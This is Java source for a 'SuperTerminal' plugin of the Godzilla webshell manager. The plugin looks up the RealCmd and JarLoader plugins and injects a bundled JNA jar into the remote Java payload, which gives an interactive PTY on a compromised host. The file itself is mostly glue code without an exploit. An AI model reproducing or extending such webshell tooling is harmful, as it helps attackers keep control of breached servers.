package shells.plugins.java;

import core.annotation.PluginAnnotation;
import core.ui.ShellManage;
import core.ui.component.dialog.GOptionPane;
import shells.plugins.generic.RealCmd;
import shells.plugins.generic.SuperTerminal;
import util.Log;
import util.functions;

@PluginAnnotation(
   payloadName = "JavaDynamicPayload",
   Name = "SuperTerminal",
   DisplayName = "超级终端"
)
public class JSuperTerminal extends SuperTerminal {
   private JarLoader jarLoader;

   public RealCmd getRealCmd() {
      RealCmd plugin = (RealCmd)this.shellEntity.getFrame().getPlugin("RealCmd");
      if (plugin != null) {
         return plugin;
      } else {
         GOptionPane.showMessageDialog(super.getView(), "未找到HttpProxy插件!", "提示", 0);
         return null;
      }
   }

   public boolean winptyInit(String tmpCommand) throws Exception {
      boolean superRet = super.winptyInit(tmpCommand);

      try {
         if (this.jarLoader == null) {
            ShellManage shellManage = this.shellEntity.getFrame();
            this.jarLoader = (JarLoader)shellManage.getPlugin("JarLoader");
         }
      } catch (Exception var4) {
         GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "no find plugin JarLoader!");
         throw new RuntimeException("no find plugin JarLoader!");
      }

      if (superRet) {
         if (!this.jarLoader.hasClass("jna.pty4j.windows.WinPtyProcess") && !this.jarLoader.loadJar(functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("assets/GodzillaJna.jar")))) {
            Log.log("加载GodzillaJna失败");
         }

         return true;
      } else {
         return superRet;
      }
   }
}
